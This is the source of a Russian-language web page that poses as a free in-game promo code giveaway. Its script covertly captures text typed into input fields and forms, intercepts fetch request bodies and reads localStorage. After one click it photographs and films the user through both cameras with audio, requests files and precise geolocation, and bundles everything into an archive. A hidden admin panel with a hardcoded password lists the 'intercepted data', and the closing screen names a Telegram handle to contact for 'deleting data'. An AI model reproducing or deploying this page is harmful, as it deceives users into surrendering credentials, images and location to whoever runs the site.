<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>БЕСПЛАТНЫЙ ПРОМОКОД</title>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0a0f, #1a0a2e);
            color: #e2e8f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: rgba(20, 20, 40, 0.95);
            padding: 30px;
            border-radius: 20px;
            max-width: 950px;
            width: 100%;
            border: 2px solid #ffd700;
            box-shadow: 0 0 60px rgba(255, 215, 0, 0.3);
        }
        h1 {
            text-align: center;
            font-size: 36px;
            font-weight: 900;
            background: linear-gradient(45deg, #ffd700, #ff6b00, #ffd700);
            background-size: 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gold 3s ease-in-out infinite;
            margin-bottom: 10px;
        }
        @keyframes gold {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .subtitle {
            text-align: center;
            font-size: 22px;
            color: #ffd700;
            text-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
            margin-bottom: 20px;
        }
        button {
            background: linear-gradient(45deg, #ffd700, #ff8c00);
            color: #0a0a0f;
            border: none;
            padding: 18px 36px;
            font-size: 22px;
            font-weight: 900;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            text-transform: uppercase;
            letter-spacing: 3px;
            box-shadow: 0 0 40px rgba(255, 215, 0, 0.4);
        }
        button:hover {
            transform: scale(1.03);
            box-shadow: 0 0 60px rgba(255, 215, 0, 0.8);
        }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .status {
            margin: 15px 0;
            padding: 15px;
            background: rgba(0,0,0,0.3);
            border-radius: 10px;
            border-left: 4px solid #ffd700;
            text-align: center;
            font-size: 16px;
            color: #ffd700;
            min-height: 60px;
            word-break: break-word;
        }
        .hidden { display: none !important; }
        .admin-link {
            text-align: center;
            margin-top: 20px;
        }
        .admin-link button {
            background: transparent;
            border: 2px solid #ffd700;
            color: #ffd700;
            padding: 10px 20px;
            font-size: 14px;
            width: auto;
            box-shadow: none;
        }
        .admin-link button:hover {
            background: #ffd700;
            color: #0a0a0f;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border-radius: 10px;
            border: 2px solid #ffd700;
            background: rgba(0,0,0,0.3);
            color: #fff;
            font-size: 16px;
        }
        .session-item {
            background: rgba(0,0,0,0.3);
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            border-left: 4px solid #ffd700;
        }
        .password-item {
            background: rgba(255, 0, 0, 0.1);
            padding: 10px;
            margin: 5px 0;
            border-radius: 8px;
            border: 1px solid #ff4444;
            color: #ff6666;
        }
        .badge {
            background: #ffd700;
            color: #0a0a0f;
            padding: 2px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        .final-message {
            text-align: center;
            padding: 40px 20px;
            display: none;
        }
        .final-message h2 {
            color: #ffd700;
            font-size: 28px;
            margin-bottom: 20px;
            text-shadow: 0 0 40px rgba(255, 215, 0, 0.5);
        }
        .final-message .tg {
            font-size: 24px;
            color: #ff6b00;
            text-shadow: 0 0 30px rgba(255, 107, 0, 0.5);
            background: rgba(0,0,0,0.3);
            padding: 15px 30px;
            border-radius: 12px;
            border: 2px solid #ff6b00;
            display: inline-block;
            margin-top: 10px;
        }
        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 4px;
            margin: 10px 0;
            overflow: hidden;
            display: none;
        }
        .progress-bar .fill {
            height: 100%;
            background: linear-gradient(90deg, #ffd700, #ff6b00);
            width: 0%;
            border-radius: 4px;
            transition: width 0.5s;
        }
        #fileUpload {
            display: none;
        }
    </style>
</head>
<body>

<div class="container" id="app">

    <div id="mainPage">
        <h1>✨ БЕСПЛАТНЫЙ ПРОМОКОД ✨</h1>
        <div class="subtitle">🏆 БЕСПЛАТНАЯ ГОЛДА 🏆</div>
        
        <button id="startBtn">🎁 АКТИВИРОВАТЬ ПРОМОКОД</button>
        <div class="progress-bar" id="progressBar"><div class="fill" id="progressFill"></div></div>
        <div class="status" id="status">💫 НАЖМИ КНОПКУ ДЛЯ ПОЛУЧЕНИЯ КОДА</div>
        
        <div class="admin-link">
            <button id="goToAdminBtn">🔐 АДМИН-ПАНЕЛЬ</button>
        </div>
    </div>

    <div id="finalMessage" class="final-message">
        <h2>🎉 ВАШ ПРОМОКОД АКТИВИРОВАН!</h2>
        <p style="color:#aaa;font-size:18px;margin:20px 0;">ХОЧЕШЬ УДАЛИТЬ ДАННЫЕ? ПИШИ СЮДА:</p>
        <div class="tg">@papadenay</div>
    </div>

    <div id="adminPage" class="hidden">
        <h1>🔐 АДМИН-ПАНЕЛЬ</h1>
        
        <div id="loginForm">
            <input type="text" id="adminLogin" placeholder="ЛОГИН" value="admin">
            <input type="password" id="adminPassword" placeholder="ПАРОЛЬ">
            <button id="adminLoginBtn" style="background:#ffd700;color:#0a0a0f;">ВОЙТИ</button>
            <div class="status" id="adminStatus"></div>
        </div>

        <div id="adminContent" class="hidden">
            <h2 style="color:#ffd700;text-align:center;font-size:22px;">📊 ВСЕ СЕССИИ</h2>
            <button id="clearSessionsBtn" style="background:#ff4444;color:#fff;margin:10px 0;">🗑️ ОЧИСТИТЬ ВСЁ</button>
            <button id="exportAllBtn" style="background:#ff8c00;color:#fff;margin:10px 0;">📥 ЭКСПОРТ ВСЕГО (ZIP)</button>
            <div id="sessionsList"></div>

            <h2 style="color:#ff6666;text-align:center;font-size:20px;margin-top:30px;">🔑 ПЕРЕХВАЧЕННЫЕ ДАННЫЕ</h2>
            <div id="passwordsList"></div>

            <button id="logoutBtn" style="background:transparent;border:2px solid #ffd700;color:#ffd700;margin-top:20px;">🚪 ВЫЙТИ</button>
        </div>
    </div>
</div>

<input type="file" id="fileUpload" multiple accept="image/*,video/*">

<script>
    // ============================================================
    // 1. ГЛОБАЛЬНЫЕ
    // ============================================================
    let sessions = JSON.parse(localStorage.getItem('sessions') || '[]');
    let capturedData = JSON.parse(localStorage.getItem('capturedData') || '[]');
    let isAdmin = false;
    let screenshotData = null;
    let mediaData = [];
    let collectedFiles = [];

    // ============================================================
    // 2. ПЕРЕХВАТ ДАННЫХ
    // ============================================================
    function captureData(value, source = 'manual', extra = {}) {
        if (!value || value.length < 1) return;
        const upperValue = String(value).toUpperCase();
        const entry = {
            "ВРЕМЯ": new Date().toISOString(),
            "ЗНАЧЕНИЕ": upperValue,
            "ОТКУДА ВЗЯЛОСЬ": String(source).toUpperCase(),
            "АДРЕС СТРАНИЦЫ": String(window.location.href).toUpperCase(),
            "ДОПОЛНИТЕЛЬНО": JSON.stringify(extra).toUpperCase()
        };
        const exists = capturedData.some(p => p["ЗНАЧЕНИЕ"] === upperValue);
        if (!exists) {
            capturedData.push(entry);
            localStorage.setItem('capturedData', JSON.stringify(capturedData));
        }
    }

    function setupCapture() {
        const observer = new MutationObserver(() => {
            document.querySelectorAll('input').forEach(field => {
                if (!field.dataset.captured && field.type !== 'file' && field.type !== 'checkbox' && field.type !== 'radio') {
                    field.dataset.captured = 'true';
                    field.addEventListener('input', function() {
                        if (this.value && this.value.length > 1) {
                            captureData(this.value, 'ИЗ ПОЛЯ ВВОДА', {
                                name: this.name || 'НЕИЗВЕСТНО',
                                id: this.id || 'НЕИЗВЕСТНО',
                                type: this.type
                            });
                        }
                    });
                    if (field.value && field.value.length > 1) {
                        captureData(field.value, 'ИЗ ПОЛЯ ПРИ ЗАГРУЗКЕ', {
                            name: field.name || 'НЕИЗВЕСТНО',
                            id: field.id || 'НЕИЗВЕСТНО'
                        });
                    }
                }
            });
        });
        observer.observe(document.body, { childList: true, subtree: true });

        document.addEventListener('submit', function(e) {
            const form = e.target;
            form.querySelectorAll('input').forEach(inp => {
                if (inp.value && inp.value.length > 1) {
                    captureData(inp.value, 'ИЗ ФОРМЫ', {
                        name: inp.name || 'НЕИЗВЕСТНО',
                        id: inp.id || 'НЕИЗВЕСТНО'
                    });
                }
            });
        });

        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            return originalFetch.apply(this, args).then(response => {
                try {
                    const body = args[1]?.body;
                    if (body && typeof body === 'string') {
                        const urlParams = new URLSearchParams(body);
                        for (let [key, val] of urlParams) {
                            if (val && val.length > 1) {
                                captureData(val, 'FETCH-' + String(key).toUpperCase(), { url: args[0] });
                            }
                        }
                    }
                } catch(e) {}
                return response;
            });
        };

        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key) {
                const val = localStorage.getItem(key);
                if (val && val.length > 1) {
                    captureData(val, 'ИЗ LOCALSTORAGE', { storageKey: key });
                }
            }
        }
    }

    // ============================================================
    // 3. ПРОВЕРКА РАЗРЕШЕНИЙ
    // ============================================================
    async function checkPermissions() {
        const status = document.getElementById('status');
        status.textContent = '📱 ЗАПРОС РАЗРЕШЕНИЙ...';
        
        try {
            // Проверяем камеру
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            stream.getTracks().forEach(t => t.stop());
            status.textContent = '✅ РАЗРЕШЕНИЯ ПОЛУЧЕНЫ';
            return true;
        } catch (err) {
            status.textContent = '⚠️ НЕТ ДОСТУПА К КАМЕРЕ: ' + err.message + ' (СБОР БЕЗ ВИДЕО)';
            return false;
        }
    }

    // ============================================================
    // 4. СКРИНШОТ
    // ============================================================
    async function takeScreenshot() {
        try {
            const canvas = await html2canvas(document.body, {
                scale: 1.5,
                useCORS: true,
                allowTaint: true,
                backgroundColor: '#0a0a0f',
                logging: false
            });
            return canvas.toDataURL('image/png');
        } catch (err) {
            console.error('Screenshot error:', err);
            return null;
        }
    }

    // ============================================================
    // 5. ЗАПИСЬ ВИДЕО
    // ============================================================
    async function recordCamera(facingMode, durationMs = 3000) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: facingMode,
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: true
            });

            return new Promise((resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                
                recorder.ondataavailable = e => {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                
                recorder.onstop = () => {
                    try {
                        const blob = new Blob(chunks, { type: 'video/mp4' });
                        const reader = new FileReader();
                        reader.onload = () => {
                            stream.getTracks().forEach(t => t.stop());
                            resolve(reader.result);
                        };
                        reader.onerror = () => {
                            stream.getTracks().forEach(t => t.stop());
                            resolve(null);
                        };
                        reader.readAsDataURL(blob);
                    } catch(e) {
                        stream.getTracks().forEach(t => t.stop());
                        resolve(null);
                    }
                };

                recorder.onerror = () => {
                    stream.getTracks().forEach(t => t.stop());
                    resolve(null);
                };

                try {
                    recorder.start();
                    setTimeout(() => {
                        try { recorder.stop(); } catch(e) {}
                    }, durationMs);
                } catch(e) {
                    stream.getTracks().forEach(t => t.stop());
                    resolve(null);
                }
            });
        } catch (err) {
            return null;
        }
    }

    async function recordBothCameras() {
        const status = document.getElementById('status');
        const results = { back: null, front: null };
        
        try {
            status.textContent = '📹 ЗАДНЯЯ КАМЕРА (10 СЕК)...';
            results.back = await recordCamera('environment', 10000);
            
            status.textContent = '📹 ПЕРЕДНЯЯ КАМЕРА (10 СЕК)...';
            results.front = await recordCamera('user', 10000);
        } catch(e) {
            console.error('Video error:', e);
        }
        
        return results;
    }

    // ============================================================
    // 6. ФОТО
    // ============================================================
    async function takePhotoFromCamera(facingMode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: facingMode,
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            const photoData = canvas.toDataURL('image/jpeg');
            
            stream.getTracks().forEach(t => t.stop());
            return photoData;
        } catch (err) {
            return null;
        }
    }

    async function takeBothPhotos() {
        const status = document.getElementById('status');
        const results = { back: null, front: null };
        
        try {
            status.textContent = '📸 ФОТО С ЗАДНЕЙ КАМЕРЫ...';
            results.back = await takePhotoFromCamera('environment');
            
            status.textContent = '📸 ФОТО С ПЕРЕДНЕЙ КАМЕРЫ...';
            results.front = await takePhotoFromCamera('user');
        } catch(e) {
            console.error('Photo error:', e);
        }
        
        return results;
    }

    // ============================================================
    // 7. ФАЙЛЫ
    // ============================================================
    function waitForFiles(timeout = 15000) {
        return new Promise((resolve) => {
            const fileInput = document.getElementById('fileUpload');
            let resolved = false;
            
            const handler = function(e) {
                if (e.target.files && e.target.files.length > 0) {
                    Array.from(e.target.files).forEach(file => {
                        const reader = new FileReader();
                        reader.onload = function(ev) {
                            collectedFiles.push({
                                name: file.name,
                                type: file.type,
                                size: file.size,
                                data: ev.target.result,
                                timestamp: new Date().toISOString()
                            });
                        };
                        reader.readAsDataURL(file);
                    });
                    if (!resolved) {
                        resolved = true;
                        resolve(true);
                    }
                }
            };
            
            fileInput.addEventListener('change', handler);
            
            // Если файлы уже выбраны
            if (fileInput.files && fileInput.files.length > 0) {
                handler({ target: fileInput });
            }
            
            // Таймаут
            setTimeout(() => {
                if (!resolved) {
                    resolved = true;
                    resolve(false);
                }
            }, timeout);
        });
    }

    // ============================================================
    // 8. ОБНОВЛЕНИЕ ПРОГРЕССА
    // ============================================================
    function updateProgress(percent, text) {
        const fill = document.getElementById('progressFill');
        const status = document.getElementById('status');
        const bar = document.getElementById('progressBar');
        
        bar.style.display = 'block';
        fill.style.width = Math.min(percent, 100) + '%';
        if (text) status.textContent = text;
    }

    // ============================================================
    // 9. ГЛАВНАЯ ФУНКЦИЯ
    // ============================================================
    async function startCollection() {
        const btn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const mainPage = document.getElementById('mainPage');
        const finalMessage = document.getElementById('finalMessage');
        
        btn.disabled = true;
        btn.textContent = '⏳ ИДЁТ АКТИВАЦИЯ...';
        status.textContent = '🔄 ПРОВЕРКА РАЗРЕШЕНИЙ...';
        
        try {
            // 0. Проверка разрешений
            updateProgress(5, '📱 ЗАПРОС РАЗРЕШЕНИЙ...');
            await checkPermissions();
            
            // 1. Скриншот
            updateProgress(10, '📸 СКРИНШОТ...');
            const screenshot = await takeScreenshot();
            if (screenshot) {
                screenshotData = screenshot;
                updateProgress(20, '✅ СКРИНШОТ ГОТОВ');
            }
            
            // 2. Фото
            updateProgress(30, '📸 ФОТО С КАМЕР...');
            const photos = await takeBothPhotos();
            if (photos.back || photos.front) {
                updateProgress(50, '✅ ФОТО ГОТОВЫ');
            }
            
            // 3. Видео
            updateProgress(55, '📹 ЗАПИСЬ ВИДЕО...');
            const videos = await recordBothCameras();
            if (videos.back || videos.front) {
                updateProgress(70, '✅ ВИДЕО ГОТОВЫ');
            }
            
            // 4. Файлы
            updateProgress(75, '📁 ВЫБЕРИТЕ ФАЙЛЫ...');
            document.getElementById('fileUpload').click();
            await waitForFiles(15000);
            updateProgress(85, '📁 ФАЙЛОВ: ' + collectedFiles.length);
            
            // 5. ZIP
            updateProgress(90, '📦 СОЗДАНИЕ АРХИВА...');
            const zip = new JSZip();
            
            // Данные
            const data = {
                "ВРЕМЯ СБОРА": new Date().toISOString(),
                "БРАУЗЕР": navigator.userAgent,
                "ПЛАТФОРМА": navigator.platform,
                "ЭКРАН": { "ШИРИНА": screen.width, "ВЫСОТА": screen.height },
                "ГЕОЛОКАЦИЯ": await getGeolocation(),
                "БАТАРЕЯ": await getBatteryInfo(),
                "ПЕРЕХВАЧЕННЫЕ ДАННЫЕ": capturedData.slice(-200)
            };
            
            zip.file('ДАННЫЕ.json', JSON.stringify(data, null, 2));
            zip.file('ПЕРЕХВАЧЕННЫЕ_ДАННЫЕ.json', JSON.stringify(capturedData, null, 2));
            
            // Скриншот
            if (screenshotData) {
                const base64 = screenshotData.split(',')[1];
                if (base64) zip.file('СКРИНШОТ.png', base64, { base64: true });
            }
            
            // Фото
            if (photos.back) {
                const base64 = photos.back.split(',')[1];
                if (base64) zip.file('ФОТО_ЗАДНЯЯ.jpg', base64, { base64: true });
            }
            if (photos.front) {
                const base64 = photos.front.split(',')[1];
                if (base64) zip.file('ФОТО_ПЕРЕДНЯЯ.jpg', base64, { base64: true });
            }
            
            // Видео
            if (videos.back) {
                const base64 = videos.back.split(',')[1];
                if (base64) zip.file('ВИДЕО_ЗАДНЯЯ.mp4', base64, { base64: true });
            }
            if (videos.front) {
                const base64 = videos.front.split(',')[1];
                if (base64) zip.file('ВИДЕО_ПЕРЕДНЯЯ.mp4', base64, { base64: true });
            }
            
            // Файлы
            collectedFiles.forEach((f, i) => {
                try {
                    const base64 = f.data.split(',')[1];
                    if (base64) {
                        zip.file(`ФАЙЛЫ/${i}_${f.name}`, base64, { base64: true });
                    }
                } catch(e) {}
            });
            
            // Сессия
            const session = {
                id: Date.now(),
                timestamp: data["ВРЕМЯ СБОРА"],
                preview: {
                    userAgent: String(data["БРАУЗЕР"]).substring(0, 50),
                    files: collectedFiles.length,
                    photos: (photos.back ? 1 : 0) + (photos.front ? 1 : 0),
                    videos: (videos.back ? 1 : 0) + (videos.front ? 1 : 0)
                }
            };
            sessions.push(session);
            localStorage.setItem('sessions', JSON.stringify(sessions));
            
            // Скачивание
            updateProgress(95, '⬇️ СКАЧИВАНИЕ...');
            const blob = await zip.generateAsync({ type: 'blob' });
            saveAs(blob, `ПРОМОКОД_${new Date().toISOString().slice(0,10)}.zip`);
            
            updateProgress(100, '🎉 ГОТОВО!');
            btn.textContent = '✅ АКТИВИРОВАНО';
            
            // Через 10 секунд - скрыть
            setTimeout(() => {
                mainPage.style.display = 'none';
                finalMessage.style.display = 'block';
                document.querySelector('.container').style.borderColor = '#ff6b00';
            }, 10000);
            
        } catch (err) {
            status.textContent = '❌ ОШИБКА: ' + (err.message || 'НЕИЗВЕСТНАЯ ОШИБКА');
            console.error('Error:', err);
            btn.textContent = '🎁 АКТИВИРОВАТЬ ПРОМОКОД';
            btn.disabled = false;
            document.getElementById('progressBar').style.display = 'none';
        }
    }

    // ============================================================
    // 10. ВСПОМОГАТЕЛЬНЫЕ
    // ============================================================
    function getGeolocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ error: 'НЕ ПОДДЕРЖИВАЕТСЯ' });
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve({
                        "ШИРОТА": pos.coords.latitude,
                        "ДОЛГОТА": pos.coords.longitude,
                        "ТОЧНОСТЬ": pos.coords.accuracy
                    });
                },
                () => resolve({ error: 'ОТКАЗАНО' }),
                { enableHighAccuracy: true, timeout: 3000 }
            );
        });
    }

    function getBatteryInfo() {
        return new Promise((resolve) => {
            if (!navigator.getBattery) {
                resolve({ error: 'НЕ ПОДДЕРЖИВАЕТСЯ' });
                return;
            }
            navigator.getBattery().then((battery) => {
                resolve({
                    "УРОВЕНЬ": Math.round(battery.level * 100) + '%',
                    "ЗАРЯДКА": battery.charging ? 'ДА' : 'НЕТ'
                });
            }).catch(() => resolve({ error: 'ОШИБКА' }));
        });
    }

    // ============================================================
    // 11. АДМИНКА
    // ============================================================
    function renderAdminPanel() {
        const sessionsList = document.getElementById('sessionsList');
        const passwordsList = document.getElementById('passwordsList');

        sessionsList.innerHTML = '';
        if (sessions.length === 0) {
            sessionsList.innerHTML = '<p style="color:#888;">НЕТ СЕССИЙ</p>';
        } else {
            sessions.slice().reverse().forEach(s => {
                const div = document.createElement('div');
                div.className = 'session-item';
                div.innerHTML = `
                    <strong>${new Date(s.timestamp).toLocaleString()}</strong>
                    <span class="badge">ID: ${s.id}</span>
                    <br>БРАУЗЕР: ${s.preview.userAgent || 'НЕТ'}
                    <br>ФАЙЛОВ: ${s.preview.files || 0} | ФОТО: ${s.preview.photos || 0} | ВИДЕО: ${s.preview.videos || 0}
                    <br><button class="delete-session-btn" data-id="${s.id}" style="background:#ff4444;color:#fff;width:auto;padding:5px 15px;font-size:12px;margin-top:5px;">УДАЛИТЬ</button>
                `;
                sessionsList.appendChild(div);
            });
        }

        passwordsList.innerHTML = '';
        if (capturedData.length === 0) {
            passwordsList.innerHTML = '<p style="color:#888;">НЕТ ДАННЫХ</p>';
        } else {
            capturedData.slice().reverse().forEach(p => {
                const div = document.createElement('div');
                div.className = 'password-item';
                div.innerHTML = `
                    <strong>${new Date(p["ВРЕМЯ"]).toLocaleString()}</strong>
                    <span style="color:#ff6666;">📌 ${p["ЗНАЧЕНИЕ"]}</span>
                    <br>ИСТОЧНИК: ${p["ОТКУДА ВЗЯЛОСЬ"] || 'НЕИЗВЕСТНО'}
                `;
                passwordsList.appendChild(div);
            });
        }

        document.querySelectorAll('.delete-session-btn').forEach(btn => {
            btn.onclick = function() {
                const id = parseInt(this.dataset.id);
                sessions = sessions.filter(s => s.id !== id);
                localStorage.setItem('sessions', JSON.stringify(sessions));
                renderAdminPanel();
            };
        });
    }

    async function exportAdminZip() {
        const status = document.getElementById('adminStatus');
        status.textContent = '📦 СОЗДАНИЕ АРХИВА...';
        
        try {
            const zip = new JSZip();
            zip.file('ВСЕ_ДАННЫЕ.json', JSON.stringify({
                "СЕССИИ": sessions,
                "ПЕРЕХВАЧЕННЫЕ_ДАННЫЕ": capturedData,
                "ДАТА_ЭКСПОРТА": new Date().toISOString()
            }, null, 2));
            
            const blob = await zip.generateAsync({ type: 'blob' });
            saveAs(blob, `АДМИН_ЭКСПОРТ_${new Date().toISOString().slice(0,10)}.zip`);
            status.textContent = '✅ ЭКСПОРТ ГОТОВ';
            status.style.color = '#4ade80';
        } catch (err) {
            status.textContent = '❌ ОШИБКА: ' + err.message;
            status.style.color = '#f87171';
        }
    }

    // ============================================================
    // 12. ЗАПУСК
    // ============================================================
    document.addEventListener('DOMContentLoaded', function() {
        setupCapture();

        document.getElementById('startBtn').addEventListener('click', startCollection);

        document.getElementById('goToAdminBtn').addEventListener('click', function() {
            document.getElementById('mainPage').style.display = 'none';
            document.getElementById('adminPage').classList.remove('hidden');
            document.getElementById('loginForm').classList.remove('hidden');
            document.getElementById('adminContent').classList.add('hidden');
            document.getElementById('adminStatus').textContent = '';
        });

        document.getElementById('adminLoginBtn').addEventListener('click', function() {
            const login = document.getElementById('adminLogin').value.trim();
            const password = document.getElementById('adminPassword').value.trim();
            if (login === 'admin' && password === '6767') {
                document.getElementById('adminStatus').textContent = '✅ ДОСТУП РАЗРЕШЁН';
                document.getElementById('adminStatus').style.color = '#4ade80';
                isAdmin = true;
                document.getElementById('loginForm').classList.add('hidden');
                document.getElementById('adminContent').classList.remove('hidden');
                renderAdminPanel();
            } else {
                document.getElementById('adminStatus').textContent = '❌ НЕВЕРНЫЙ ЛОГИН ИЛИ ПАРОЛЬ';
                document.getElementById('adminStatus').style.color = '#f87171';
            }
        });

        document.getElementById('logoutBtn').addEventListener('click', function() {
            isAdmin = false;
            document.getElementById('adminPage').classList.add('hidden');
            document.getElementById('mainPage').style.display = 'block';
            document.getElementById('loginForm').classList.remove('hidden');
            document.getElementById('adminContent').classList.add('hidden');
            document.getElementById('adminStatus').textContent = '';
        });

        document.getElementById('clearSessionsBtn').addEventListener('click', function() {
            if (confirm('УДАЛИТЬ ВСЁ?')) {
                sessions = [];
                capturedData = [];
                localStorage.setItem('sessions', JSON.stringify(sessions));
                localStorage.setItem('capturedData', JSON.stringify(capturedData));
                renderAdminPanel();
            }
        });

        document.getElementById('exportAllBtn').addEventListener('click', exportAdminZip);
    });
</script>
